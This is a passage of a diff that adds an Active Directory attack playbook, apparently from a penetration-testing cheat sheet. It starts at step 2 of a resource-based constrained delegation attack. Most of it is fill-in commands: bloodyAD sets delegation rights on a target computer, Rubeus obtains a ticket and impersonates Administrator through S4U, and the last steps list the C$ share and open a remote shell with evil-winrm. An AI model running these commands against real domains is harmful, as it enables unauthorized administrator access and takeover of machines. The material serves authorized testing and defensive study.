@@ -1,0 +1,26 @@
+2. **Configure RBCD on Target Computer**
+   - Modify `msDS-AllowedToActOnBehalfOfOtherIdentity` on target computer
+   - Set it to the SID of your fake computer account
+   ```bash
+   bloodyAD -d <domain> -u <user> -p <pass> set rbcd <TARGET_COMPUTER$> --delegate-from <FAKE_COMPUTER$>
+   ```
+
+3. **Obtain TGT for Fake Computer**
+   ```bash
+   # Get hash of fake computer
+   bloodyAD -d <domain> -u <user> -p <pass> get object <FAKE_COMPUTER$> --attr unicodePwd
+   
+   # Or request TGT via Kerberos
+   Rubeus.exe asktgt /user:FAKE_COMPUTER$ /password:"Pass123!" /domain:<domain> /dc:<DC> /ptt
+   ```
+
+4. **Request Service Ticket (S4U2self + S4U2proxy)**
+   ```bash
+   # Impersonate target user (e.g., Administrator) to target service (e.g., cifs/TARGET)
+   Rubeus.exe s4u /user:FAKE_COMPUTER$ /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.com /ptt
+   ```
+
+5. **Use Ticket for Access**
+   - Ticket injected into current session (`/ptt`)
+   - Access target: `dir \\TARGET.domain.com\C$`
+   - Get shell: `evil-winrm -i TARGET.domain.com -r domain.com` (uses ticket)
